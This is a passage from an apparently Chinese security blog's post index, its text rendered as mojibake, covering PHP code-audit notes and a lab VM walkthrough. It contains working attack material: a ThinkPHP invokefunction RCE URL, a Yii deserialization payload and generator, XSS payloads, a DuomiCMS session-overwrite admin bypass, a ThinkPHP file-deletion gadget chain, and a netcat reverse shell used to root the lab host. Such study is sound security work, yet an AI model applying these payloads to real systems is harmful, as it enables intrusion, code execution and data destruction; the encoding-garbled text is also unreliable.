call_user_func_array ä¸€ä¸ªé€ä¸ªä¼ å…¥å‚æ•° ï¼Œ ä¸€ä¸ªæ•°ç»„ä¼ å…¥å‚æ•° ç”¨ call_user_func_array â†’ è¦æ±‚ vars[1] å¿…é¡»æ˜¯æ•°ç»„ï¼ˆæ‰€ä»¥åŠ  [] å˜æˆäºŒç»´ï¼‰ï¼› ç”¨ call_user_func â†’ è¦æ±‚ vars[1] æ˜¯æ™®é€šå€¼ï¼ˆæ‰€ä»¥ä¸åŠ  []ï¼Œä¿æŒä¸€ç»´ï¼‰ã€‚ function add($a, $b) return $a + $b; echo call_user_func(add, 1, 2); // è¾“å‡º 3 è¦æ±‚ä¼ å…¥å¿…é¡»æ˜¯æ•°ç»„$vars = [ 0 = system, // ç¬¬ä¸€ä¸ªå‚æ•°ï¼šè¦è°ƒç”¨çš„å‡½æ•°åï¼ˆsystemï¼‰ 1 = [calc] // ç¬¬äºŒä¸ªå‚æ•°ï¼šä¼ ç»™ system çš„å‚æ•°ï¼ˆå¿…é¡»æ˜¯æ•°ç»„ï¼ï¼‰];function show($name, $age) echo Name: $name, Age: $age; $params = [Tom, 20]; // åŠ¨æ€ç”Ÿæˆçš„å‚æ•°æ•°ç»„ call_user_func_array(show, $params); // è¾“å‡º Name: Tom, Age: 20 ?s=index/\\think\\Container/invokefunctionfunction=call_user_funcvars[0]=systemvars[1]=calc?s=index/\\think\\Container/invokefunctionfunction=call_user_func_arrayvars[0]=systemvars[1][]=calcä¸åŠ arrayä¹Ÿå¯ä»¥","tags":["php"]},{"title":"PHPä»£ç å®¡è®¡9-æ¡†æ¶-YII","path":"/2025/10/16/posts/code11phpmvc/","content":"PHPä»£ç å®¡è®¡9-æ¡†æ¶-YII-ååºåˆ—åŒ– å›½å¤–å¾ˆå¤šYIIï¼Œå›½å†…PHPä¸€èˆ¬éƒ½æ˜¯TP 80% æ¡ˆä¾‹ä¸€ï¼šYIIæºç YIIç”¨phpstudtyæ­å»ºçš„è¯æŒ‡å‘é‡Œé¢çš„WEBç›®å½• ç„¶ååœ¨configé‡Œé¢web.phpç»™cookieéšä¾¿å†™ä¸€ä¸ªå¯†é’¥ä¸Šå» æ¯”å¦‚ï¼šabcdefg1234567890abcdefg12345678 æ­å»ºå®Œæˆå¦‚ä¸‹ YIIçš„ä»£ç æ–¹æ³•æ˜¯actionå¼€å¤´çš„åŠ ä¸Šåé¢å¦‚ actionContact ä½ åœ¨URLè®¿é—®ä¸èƒ½åŠ action index.php?rsite%2Fabout è¿™æ˜¯æˆ‘è®¿é—®aboutç•Œé¢çš„URLå¯¹åº”ä»£ç ä½ç½®æ˜¯ æ‰€ä»¥åŠ å…¥æˆ‘æ–°å»ºä¸€ä¸ªæ¥å£æŒ‰ç…§æ”¹å°±è¡Œäº† ?phpnamespace app\\controllers;use yii\\web\\Controller;class StarruiController extends Controller public function actionTiantian() return dude; æ³¨æ„actionåé¢è¦å¤§å†™å¼€å¤´ä¸è¦è®¿é—®ä¸åˆ°å“¦ åˆ™å˜ä¸ºindex.php?rstarruitiantian å¦‚æœåŠ äº†å‚æ•°å‘¢å°±ç”¨ public function actionTiantiany($dude) return $dude; index.php?rstarruitiantianydudephp ååºåˆ—åŒ–å‡è®¾æœ‰ä¸‹é¢è¿™ç§ååºåˆ—åŒ–å¯æ§ç‚¹ public function actionTiantianx($dude) return unserialize(base64_encode($dude)); åˆ¤æ–­YIIç‰ˆæœ¬ æœç´¢getversionæ‰¾åˆ°ç‰ˆæœ¬ public static function getVersion() return 2.0.37; å…ˆç»™POC TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoxOntzOjk6Il9mbl9jbG9zZSI7czo3OiJwaHBpbmZvIjt9fQ ?php// æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œæ–¹ä¾¿è°ƒè¯•namespace ini_set(display_errors, 1); error_reporting(E_ALL);// 1. å®šä¹‰GuzzleHttp\\Psr7\\FnStreamç±»namespace GuzzleHttp\\Psr7 class FnStream public $_fn_close = phpinfo; // ä½¿ç”¨publicä¿®é¥°ç¬¦ï¼Œç¡®ä¿å¯åºåˆ—åŒ– // 2. å®šä¹‰yii\\db\\BatchQueryResultç±»ï¼ˆä¸ä¾èµ–Yiiæ¡†æ¶ï¼‰namespace yii\\db use GuzzleHttp\\Psr7\\FnStream; // å¯¼å…¥FnStreamç±» // ç§»é™¤Yiiçš„BaseObjectç»§æ‰¿ï¼Œæ”¹ä¸ºæ™®é€šç±» class BatchQueryResult private $_dataReader; public function __construct() // æ­£ç¡®åˆå§‹åŒ–å±æ€§ï¼ˆä½¿ç”¨-æ“ä½œç¬¦ï¼‰ $this-_dataReader = new FnStream(); // 3. å…¨å±€å‘½åç©ºé—´ï¼šæ‰§è¡Œåºåˆ—åŒ–å’Œè¾“å‡ºnamespace use yii\\db\\BatchQueryResult; try // å®ä¾‹åŒ–å¯¹è±¡ $batchResult = new BatchQueryResult(); // åºåˆ—åŒ–å¹¶Base64ç¼–ç  $serialized = serialize($batchResult); $base64Str = base64_encode($serialized); // è¾“å‡ºç»“æœ echo åºåˆ—åŒ–å¹¶Base64ç¼–ç çš„ç»“æœï¼š ; echo $base64Str; catch (Exception $e) echo æ‰§è¡Œé”™è¯¯ï¼š . $e-getMessage(); åŸç†æ˜¯æœç´¢__destruct åˆ°äº† BatchQueryResulté‡Œé¢çš„resetè°ƒç”¨äº†close æˆ‘ä»¬å°±è¦æ”¹å˜close è¿™æ–¹æ³•æ€ä¹ˆæ”¹å˜çš„å› ä¸º_dataReaderæˆ‘ä»¬å°±å¯ä»¥è®©ä»–newä¸€ä¸ªå¯ä»¥ä»£ç æ‰§è¡Œçš„ç±»é‡Œé¢æœ‰closeå°±æ‰¾åˆ°äº† public function reset() if ($this-_dataReader !== null) $this-_dataReader-close(); $this-_dataReader = null; $this-_batch = null; $this-_value = null; $this-_key = null; è¿™ä¸ªç±» class FnStream public function close() return call_user_func($this-_fn_close); æ¡ˆä¾‹äºŒï¼šIBOSåŠå…¬å¹³å°æºç RCEåå°ä»£ç æ‰§è¡Œå…ˆçœ‹æ•ˆæœ ?rdashboarddefaultindex å…ˆè¯´PHPçš„ç‰¹æ€§ calcï¼› å¯ä»¥æ‰§è¡Œå‡ºRCEä»£ç  ä¸¤ä¸ª å¦‚ä¸‹é¢æ‰€ç¤º systemcoreutilsDatabase.php æ‰¾åˆ°å¯æ§åˆ¶çš„å€¼ $filename-$backupFileName-$dumpFile databaseBackupæ–¹æ³•`$mysqlBinmysqldump --force --quick $command1 --add-drop-table $command2 $command3 --host=$db[host] $command5 --user=$db[username] --password=$db[password] $db[dbname] $tablesstr $dumpFile`; systemmodulesdashboardcontrollersDatabaseController.phpè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³• public function actionBackup() $formSubmit = Env::submitCheck(dbSubmit); $type = $msg = $url = ; $param = array(); if ($formSubmit) $status = Database::databaseBackup(); è¿™é‡Œ extract($status); $type = ; if (!empty($type)) è¿˜è¦æ³¨æ„å¼€å¯shellå¤‡ä»½","tags":["php"]},{"title":"PHPä»£ç å®¡è®¡8-XXE-XSS","path":"/2025/10/15/posts/code10phpmvc/","content":"PHPä»£ç å®¡è®¡8-XSS-XXE XSSä¸€èˆ¬æŒ–çš„æ˜¯å­˜å‚¨å‹çš„XSSä¸€èˆ¬æŒ‰ç…§åŠŸèƒ½ç‚¹æµ‹è¯• æŒ‰ç…§ä»£ç ç‚¹æ¥æŸ¥çœ‹ æ¡ˆä¾‹ä¸€ï¼šEyouCMS XSSç¬¦åˆXSSçš„ç‚¹å°±æ˜¯æ— è®ºä½ ä¸Šä¼ çš„æ–‡ä»¶æˆ–è€…è¾“å…¥çš„æ–‡å­—æ‰“å°åœ¨äº†é¡µé¢ä¸­å°±å¯ä»¥æµ‹è¯•XSS å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯æ˜¾ç¤ºåœ¨ä¸Šé¢çš„æˆ‘ä»¬å°±å¯ä»¥æµ‹è¯•ä¸Šä¼ ä¸€ä¸ªJSä»£ç çš„çœ‹èƒ½ä¸èƒ½è§¦å‘å› ä¸ºæ–‡ä»¶åä¸èƒ½åŒ…å«æ‰€ä»¥æˆ‘ä»¬å‘åŒ…æµ‹è¯• å‘é€è¿‡å»æŸ¥çœ‹å‘ç°å¯èƒ½æœ‰è¿‡æ»¤æˆ‘ä»¬æ¢ä¸€ä¸ªimgçš„è¯•è¯• æ›¿æ¢ä¸ºimgçš„ æˆåŠŸå¼¹çª—å¹¶ä¸”æ˜¯å­˜å‚¨å‹XSS ä»£ç ä¸­ä½¿ç”¨fetch assignæ¥è¾“å‡ºæ²¡æœ‰è¿‡æ»¤é€‰é¡¹ æ¡ˆä¾‹äºŒï¼šPBOOT CMSå‰å°å‘ç°ç•™è¨€æ¿åˆ°åå°æˆ‘ä»¬ç•™è¨€çœ‹çœ‹ æˆ‘ä»¬åˆ°åå°å¯†ç 123456é»˜è®¤å¯†ç  å³é”®HTMLæ ¼å¼æŸ¥çœ‹å¯ä»¥å‘ç°ç›´æ¥å®ä¾‹åŒ–äº† admin.phpMessageindex) æ‰¾åˆ°æºæ–‡ä»¶ admincontrollercontentMessageController.php public function index() $this-assign(list, true); $this-assign(fields, $this-model-getFormFieldByCode(1)); // è·å–å­—æ®µ $this-assign(messages, $this-model-getList()); $this-display(content/message.html); å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªgetListæ•°æ®åº“å‡½æ•° public function getList() return parent::table(ay_message)-where(acode= . session(acode) . ) -order(id DESC) -decode(false) -page() -select(); getlistæœ‰selectå‡½æ•° final public function select($type = null) // é—­åŒ…æŸ¥è¯¢ if (is_callable($type)) $type($this); return $this-select(); if (! isset($this-sql[field])) $this-sql[field] = *; // å¦‚æœè°ƒç”¨äº†åˆ†é¡µå‡½æ•°ä¸”åˆ†é¡µï¼Œåˆ™æ‰§è¡Œåˆ†é¡µå¤„ç† if (isset($this-sql[paging]) $this-sql[paging]) // ç”Ÿæˆæ€»æ•°è®¡ç®—è¯­å¥ $count_sql = $this-buildSql($this-countSql, false); // è·å–è®°å½•æ€»æ•° if (! ! $rs = $this-getDb()-one($count_sql)) $total = $rs-sum; // åˆ†é¡µå†…å®¹ $limit = Paging::getInstance()-limit($total, true); // è·å–åˆ†é¡µå‚æ•°å¹¶è®¾ç½®åˆ†é¡µ $this-limit($limit); // æ„å»ºæŸ¥è¯¢è¯­å¥ $sql = $this-buildSql($this-selectSql); if ($type === false) return $sql; $result = $this-getDb()-all($sql, $type); return $this-outData($result); selecté‡Œé¢æœ‰ outdataæŸ¥çœ‹ä¿¡æ¯ decode_slashes final protected function outData($result) if ($this-decode) $result = decode_string($result); $this-decode = false; else $result = decode_slashes($result); if ($this-showRs) print_r($result); exit(); else return $result; å‘ç°äº†å®ä½“åŒ– // å­—ç¬¦åè½¬ä¹‰æ–œæ ï¼Œæ”¯æŒå­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡function decode_slashes($string) if (! $string) return $string; if (is_array($string)) // æ•°ç»„å¤„ç† foreach ($string as $key = $value) $string[$key] = decode_slashes($value); elseif (is_object($string)) // å¯¹è±¡å¤„ç† foreach ($string as $key = $value) $string-$key = decode_slashes($value); else // å­—ç¬¦ä¸²å¤„ç† $string = stripcslashes($string); return $string; ä½†æ˜¯é‡Œé¢æœ‰stripcslashes å®ƒå¯ä»¥è®©å­—ç¬¦16è¿›åˆ¶è¿›æ¥ç„¶åè½¬æ¢ å°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä¼ å…¥16è¿›åˆ¶å­—ç¬¦ payload å¯¹åº”16è¿›åˆ¶å’Œ \\x3cscript\\x3ealert(\\x221111111\\x22)\\x3b\\x3cscript\\x3e \\x3c â†’ åå…­è¿›åˆ¶ 3C â†’ å¯¹åº” ASCII å­—ç¬¦ ï¼ˆå°äºå·ï¼‰ã€‚ \\x3e â†’ åå…­è¿›åˆ¶ 3E â†’ å¯¹åº” ASCII å­—ç¬¦ ï¼ˆå¤§äºå·ï¼‰ æ¡ˆä¾‹ä¸‰ï¼šPHPSHE XXEæœç´¢XMLå…³é”®ä»£ç  simplexml_load_string æ‰¾åˆ°ä½ç½®æŸ¥çœ‹å¼•ç”¨åœ°æ–¹ function pe_getxml() $xml = file_get_contents(php://input); return $xml = json_decode(json_encode(simplexml_load_string($xml, SimpleXMLElement, LIBXML_NOCDATA)), true); includepluginpaymentwechatnotify_url.php å¾—çŸ¥é€šè¿‡POSTç›´æ¥å‘åŒ…æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å‘åŒ…æµ‹è¯•","tags":["php"]},{"title":"PHPä»£ç å®¡è®¡7-å˜é‡è¦†ç›–","path":"/2025/10/10/posts/code9phpmvc/","content":"PHPä»£ç å®¡è®¡7-å˜é‡è¦†ç›– å˜é‡è¦†ç›–å°½é‡æ‰¾é…ç½®æ–‡ä»¶çš„ï¼Œå› ä¸ºå¤§é‡æ–‡ä»¶éƒ½ä¼šåŒ…å«é…ç½®æ–‡ä»¶extract :parse_str()import_request_variables()$$ ï¼š æ¯”å¦‚ $a=b $b=123 echo $$a=123 ç›¸å½“äºèµ‹å€¼a=bå˜é‡å…³é”®ä»£ç å¦‚ä¸‹ä¸ç”¨å£°æ˜å˜é‡å¾ˆæ–¹ä¾¿ä½†æ˜¯æœ‰å®‰å…¨å±é™© é€šè¿‡$$_request é€ æˆäº† $_GET $_POST ç„¶åé€šè¿‡é”®å€¼å¯¹æ¥å¯¹å˜é‡èµ‹å€¼foreach (array(_COOKIE,_POST,_GET) as $_REQUEST) //$_REQUEST $$__REQUEST=$_COOKIE $_POST $_GET foreach ($$_REQUEST as $_key = $_value) //echo $_key.br /; $$_key=$_value; //æ¯”å¦‚?a=2 å°±æ˜¯ $_key=a $$_key=$a æ„æ€å°±æ˜¯ç»™å˜é‡èµ‹å€¼ echo $b;echo $a; æ¡ˆä¾‹ä¸€ï¼šDuomiCMS å˜é‡è¦†ç›–duomiphpcommon.php ä¸‹é¢æœ‰ä»£ç  ä½†æ˜¯ä»…ä»…å°±æ˜¯èµ‹å€¼ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨æ¥å†™å…¥å†…å®¹ æ¯”å¦‚session åˆ©ç”¨sessionè¦æ‰¾åˆ°session ä»£ç session_start å°±æ˜¯è¯´è¦åŒ…å«è¿™é‡Œä»£ç  session_start();require_once(../duomiphp/common.php); foreach(Array(_GET,_POST,_COOKIE) as $_request) foreach($$_request as $_k = $_v) $$_k = _RunMagicQuotes($_v); çœ‹çœ‹ä»–çš„éªŒè¯ä»£ç  duomiphpcheck.admin.php å°±æ˜¯è¯´ä¿æŒä¼šè¯çš„è¯å‘¢ $_SESSION[â€˜duomi_admin_idâ€™] $_SESSION[â€˜duomi_group_idâ€™] $_SESSION[â€˜duomi_admin_nameâ€™] è‹¥è¿™ä¸‰ä¸ª Session å˜é‡å­˜åœ¨ä¸”æœ‰æ•ˆï¼ˆéç©ºï¼‰ï¼Œåˆ™è®¤ä¸ºç”¨æˆ·å·²ç™»å½•ï¼Œå¹¶é€šè¿‡è¿™äº›å€¼è·å–ç”¨æˆ·èº«ä»½å’Œæƒé™ï¼› å°±æ˜¯è¯´æ­£å¸¸ä¸‹ï¼š éªŒè¯è´¦å·å¯†ç é€šè¿‡åï¼Œå°†æ•°æ®åº“ä¸­æŸ¥è¯¢åˆ°çš„ userIDï¼ˆç”¨æˆ· IDï¼‰ã€groupidï¼ˆæƒé™ç»„ IDï¼‰ã€userNameï¼ˆç”¨æˆ·åï¼‰å­˜å…¥ Sessionï¼Œåç»­è¯·æ±‚é€šè¿‡è¯»å–è¿™äº›å€¼è¯†åˆ«ç”¨æˆ· var $keepUserIDTag = duomi_admin_id;var $keepgroupidTag = duomi_group_id;var $keepUserNameTag = duomi_admin_name;function keepUser()\tif($this-userID!=$this-groupid!=) global $admincachefile; $_SESSION[$this-keepUserIDTag] = $this-userID; $_SESSION[$this-keepgroupidTag] = $this-groupid; $_SESSION[$this-keepUserNameTag] = $this-userName; $fp = fopen($admincachefile,w); fwrite($fp,.?php $admin_path =. $this-adminDir; ?.); fclose($fp); return 1; else return -1; _SESSION[duomi_admin_id]1SESSION[duomi_group_id]1_SESSION[duomi_admin_name]admin _SESSION[duomi_admin_id]0SESSION[duomi_group_id]0_SESSION[duomi_admin_name]0 è®¿é—®æœ‰ä¸¤è¡Œä»£ç çš„æ–‡ä»¶ http://localhost:919/member/reg.php?_SESSION[duomi_admin_id]=1SESSION[duomi_group_id]=1_SESSION[duomi_admin_name]=admin è¿™æ—¶å€™sessionå·²ç»äº§ç”Ÿäº† å†è®¿é—®adminå°±å¯ä»¥ç›´æ¥è¿›å…¥ çœ‹çœ‹sessionæ–‡ä»¶ duomi_admin_id|s:1:1;duomi_admin_name|s:5:admin;duomi_ckstr|s:4:vadh;duomi_ckstr_last|s:0:; äº§ç”Ÿsessionçš„åŸå›  1ï¼šè¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ï¼Œsession_start() æ‰§è¡Œ\tå¦‚æœä½ æ˜¯é¦–æ¬¡è®¿é—®ï¼ˆæ²¡æœ‰ PHPSESSIDï¼‰ï¼šPHP ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ Session IDï¼ˆå¦‚ sess_xxxï¼‰ï¼Œå¹¶åœ¨æœåŠ¡å™¨çš„ Session ç›®å½•ï¼ˆé€šå¸¸æ˜¯ /tmp æˆ–é…ç½®çš„ session.save_pathï¼‰åˆ›å»ºå¯¹åº”çš„ç©ºæ–‡ä»¶ï¼ˆå¦‚ sess_xxxï¼‰ã€‚å¦‚æœä½ å·²æœ‰ Session IDï¼ˆæµè§ˆå™¨ä¿å­˜äº† PHPSESSIDï¼‰ï¼šPHP ä¼šç›´æ¥æ‰“å¼€å¯¹åº”çš„ Session æ–‡ä»¶ï¼ˆå¦‚ sess_xxxï¼‰ï¼Œå‡†å¤‡è¯»å– / ä¿®æ”¹å…¶ä¸­çš„æ•°æ®ã€‚2ï¼š\tå˜é‡è¦†ç›–æ¼æ´å°†æ³¨å…¥å‚æ•°å†™å…¥ $_SESSION å†™å…¥å¯¹åº”çš„æ•°å€¼åˆ°sessionä¸­ åŸç†å°±æ˜¯è‡ªå·±å¯ä»¥å†™å…¥æ•°æ®åˆ°sessionä¸­å»äº†ï¼Œ ç›¸å½“äº â€œè·³è¿‡äº†æœåŠ¡å™¨çš„æ­£å¸¸éªŒè¯æµç¨‹ï¼Œå¼ºè¡Œå°†æœ¬åº”ç”±æœåŠ¡å™¨å†™å…¥çš„æ•°æ®ï¼Œç”¨è‡ªå·±çš„è¾“å…¥è¦†ç›–è¿›å»â€ã€‚ åˆ¤æ–­ â€œæ˜¯å¦å·²ç™»å½•â€ çš„éšå«é€»è¾‘ éç©ºå°±å¯ä»¥ _SESSION[duomi_admin_id]SESSION[duomi_group_id]_SESSION[duomi_admin_name]å½“æ˜¯è¿™ä¸ªæ—¶å€™å°±ä¸è¡Œäº†ä½ æ”¹ä¸º0éƒ½å¯ä»¥ duomi_admin_id|s:1:0;duomi_admin_name|s:1:0;duomi_ckstr|s:4:cinm;duomi_ckstr_last|s:0:;åæ­£æœ‰å€¼å°±å¯ä»¥è¿›å»","tags":["php"]},{"title":"MVC-PHPä»£ç å®¡è®¡6-æ¡†æ¶-æ–‡ä»¶åŒ…å«","path":"/2025/10/09/posts/code8phpmvc/","content":"MVC-PHPä»£ç å®¡è®¡6-æ¡†æ¶-æ–‡ä»¶åŒ…å« åˆ¤æ–­æ˜¯å¦æ˜¯æ¡†æ¶ï¼š\tæœç´¢version THINK_VERSION\tåˆ¤æ–­è¯­æ³•\tçœ‹æ–‡ä»¶å æ¡ˆä¾‹ä¸€ï¼šThinkPHP-æ–‡ä»¶åŒ…å«cacheFiledemo.phpæ¼æ´å½±å“ç‰ˆæœ¬ï¼š 5.0.0ThinkPHP55.0.18 ã€5.1.0ThinkPHP5.1.10ã€‚ include require_once require ä¸‰ä¸ªå‡½æ•°å¯¼è‡´æ–‡ä»¶åŒ…å« å…ˆçœ‹æ•ˆæœåœ¨indexä¸‹é¢ç›´æ¥åŒ…å«å°±å¯ä»¥æ‰§è¡Œphpè„šæœ¬å‘½ä»¤ ç›´æ¥è§¦å‘äº† åˆ†æindexä¸‹é¢ç”¨äº†è¿™ä¸¤è¡Œtpè‡ªå¸¦ä»£ç  request()-get() - è·å–æ‰€æœ‰GETå‚æ•° $this-assign() - å°†GETå‚æ•°å…¨éƒ¨ä½œä¸ºæ¨¡æ¿å˜é‡èµ‹å€¼ æ‰€ä»¥catchfileæ‰èƒ½ä¼ å…¥ ?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller public function index() $this-assign(request()-get()); return $this-fetch(); // å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html è·Ÿè¸ªassign åˆ°äº†controller.php ï¼Œè¿™ä¸ªviewæ˜¯æ¨¡æ¿å®ä¾‹ä¸æ˜¯å˜é‡ @var \\think\\View protected $view; $this-view = View::instance(Config::get(template), Config::get(view_replace_str));protected function assign($name, $value = ) $this-view-assign($name, $value); return $this; è·Ÿè¸ªassignåˆ°äº†view.php public function assign($name, $value = ) if (is_array($name)) $this-data = array_merge($this-data, $name); else $this-data[$name] = $value; return $this; ä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿å•Š thinkphplibrarythinktemplatedriverFile.php æ‰¾åˆ°äº†å…³é”®çš„ä»£ç è¿™é‡Œè¦ç†è§£extractçš„å‡½æ•°ä½œç”¨ extract:ç”¨äºé€šè¿‡å‡½æ•°æ¥æ‰‹åŠ¨ç»™å˜é‡èµ‹å€¼å¯¼è‡´å˜é‡è¦†ç›– public function read($cacheFile, $vars = []) if (!empty($vars) is_array($vars)) // æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡ extract($vars, EXTR_OVERWRITE); //è½½å…¥æ¨¡ç‰ˆç¼“å­˜æ–‡ä»¶ include $cacheFile; æ­£å¸¸æ¥è¯´ includeåº”è¯¥æ˜¯ç¼“å­˜æ–‡ä»¶çš„è·¯å¾„ æ¯”å¦‚ä½ è®¿é—®indexä¸‹é¢å°±æ˜¯include indexé¡µé¢ç¼“å­˜æ–‡ä»¶ ä½†æ˜¯é€šè¿‡å˜é‡è¦†ç›–ä¿®æ”¹è·¯å¾„ä¸ºæˆ‘ä»¬çš„æ¶æ„phpæ–‡ä»¶ ?cacheFile1.txt $cacheFile1.txt ç›´æ¥Â·èµ‹å€¼ å¯åŠ¨åŠ¨æ€è°ƒè¯•æ¥æµ‹è¯•æµç¨‹phpstudyåœ¨phpè®¾ç½®é‚£é‡Œå¼€å¯x-debug æ‰“å¼€å¯¹åº”php.ini zend_extension=E:/phpstudy_pro/Extensions/php/php7.4.3nts/ext/php_xdebug.dllxdebug.collect_params=1xdebug.collect_return=1xdebug.auto_trace=Offxdebug.trace_output_dir=E:/phpstudy_pro/Extensions/php_log/php7.4.3nts.xdebug.tracexdebug.profiler_enable=Offxdebug.profiler_output_dir=E:/phpstudy_pro/Extensions/php_log/php7.4.3nts.xdebug.profilerxdebug.remote_enable=Onxdebug.remote_host=localhostxdebug.remote_port=9000xdebug.idekey=PHPSTORMxdebug.remote_handler=dbgpæ²¡æœ‰çš„è‡ªå·±æ·»åŠ ä¸Šå»ç‰¹åˆ«æ˜¯phpstormé‚£ä¸ªidekey é…ç½®phpstorm ç«¯å£æ˜¯ç½‘ç«™ç«¯å£ å¯ä»¥çœ‹çœ‹å®˜æ–¹githubå¯¹æ¯”ç‰ˆæœ¬ä¿®å¤æƒ…å†µ æ˜¯å¦æ˜¯å†…éƒ¨æµ‹è¯•äººå‘˜æ²¡æœ‰å…¬å¼€ å°±å¯ä»¥æ‹¿åˆ°æ¼æ´","tags":["php"]},{"title":"Maze-GuoQingé¶æœºï¼","path":"/2025/10/07/posts/guoqing/","content":"Maze-GuoQingé¶æœº-ä½œè€…ï¼šç¾¤ä¸»-QQç¾¤660930334 â””â”€# nmap 192.168.1.238 Starting Nmap 7.92 ( https://nmap.org ) at 2025-10-07 01:22 EDTNmap scan report for 192.168.1.238Host is up (0.00074s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:FE:EB:F8 (Oracle VirtualBox virtual NIC) è®¿é—®80æ²¡ä»€ä¹ˆä¸œè¥¿æœ‰ä¸€ä¸ªç™»å½•ç•Œé¢é€šè¿‡çˆ†ç ´å‘ç°çˆ†ç ´ä¸å‡ºæ¥ ä¸‹è½½ä¸­é—´è¿™ä¸ªé€‰æ‹©çš„å·ç¦å›¾ç‰‡ä½¿ç”¨stringså‘ç°åé¢æœ‰å­—ç¬¦å¯†ç  â”€# strings todd.png todd:toddishandsome å‘ç°å¯†ç  hyh hyhforeverç™»å½•å æœ‰ä¸€ä¸ªpasswordç¨‹åºåç¼–è¯‘è·å¾—å¯†é’¥ vhjidxowqr1 å‡¯æ’’è§£å¯†åç§»é‡3 è§£å¾—å¯†ç segfaultno1 ç™»å½•åæŸ¥çœ‹è¿›ç¨‹pspy64 /bin/sh -c cd /home/segfault rsync -t *.txt Guoqing:/tmp/backup/ åˆ›å»ºæ¶æ„è„šæœ¬æ‰§è¡Œ segfault@Guoqing:~$ vi 1.txtsegfault@Guoqing:~$ cat 1.txt #!/bin/bashbusybox nc 192.168.1.199 6666 -e /bin/bashsegfault@Guoqing:~$ segfault@Guoqing:~$ chmod +x 1.txt segfault@Guoqing:~$ echo -e sh 1.txtsegfault@Guoqing:~$ ls -alç„¶åç›‘å¬â””â”€# nc -lvvp 6666 listening on [any] 6666 ...192.168.1.238: inverse host lookup failed: Unknown hostconnect to [192.168.1.199] from (UNKNOWN) [192.168.1.238] 60544whoamirootcat /root/root.txtflagroot-834xxx","tags":["strings"]},{"title":"MVC-PHPä»£ç å®¡è®¡5-æ¡†æ¶-ååºåˆ—åŒ–æ„å»ºé“¾","path":"/2025/10/06/posts/code7phpmvc/","content":"MVC-PHPä»£ç å®¡è®¡5-æ¡†æ¶-ååºåˆ—åŒ– åˆ¤æ–­æ˜¯å¦æ˜¯æ¡†æ¶ï¼š\tæœç´¢version THINK_VERSION\tåˆ¤æ–­è¯­æ³•\tçœ‹æ–‡ä»¶å__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ æ¡ˆä¾‹ä¸€ï¼šThinkPHP-ååºåˆ—åŒ–é“¾æ–‡ä»¶åˆ é™¤çœ‹ç‰ˆæœ¬ æ¯”å¦‚æœ¬èº«æœ‰ä¸€ä¸ªååºåˆ—åŒ–å…¥å£ï¼Œå¹¶ä¸”è¿™ä¸ªå…¥å£å¯ä»¥æ§åˆ¶ public function unser() //æ¼æ´äº§ç”Ÿç‚¹ //å¦‚æœåœ¨å®é™…å®¡è®¡ä¸­å‘ç°ç±»ä¼¼ä»£ç å°±å¯ä»¥åˆ©ç”¨tpååºåˆ—åŒ–è§¦å‘å‡ºrce unserialize(base64_decode($_GET[id])); return unser!; å…¨å±€æœç´¢æ‰¾åˆ°å‡ ä¸ªå¿…è§¦å‘çš„å‡½æ•° å‘ç°ThinkPHP-v5.1.29\\thinkphp\\library\\think\\process\\pipes\\Windows.php è¿™ä¸ªå‡½æ•°è°ƒç”¨äº†removefilesç›´æ¥å°±æ˜¯ä»»æ„æ–‡ä»¶åˆ é™¤ç®€å•ç²—æš´ public function __destruct() $this-close(); $this-removeFiles(); private function removeFiles() foreach ($this-files as $filename) //system($filename); if (file_exists($filename)) @unlink($filename);//æ–‡ä»¶åˆ é™¤ æ„å»ºååºåˆ—åŒ–é“¾æ¡ ?phpnamespace think\\process\\pipes;class Pipesclass Windows extends Pipes private $files = [E:\\phpstudy_pro\\WWW\\ThinkPHP-v5.1.29\\flag.txt];$starrui = new Windows();echo base64_encode(serialize($starrui));ç”Ÿæˆä¸‹é¢ä»£ç 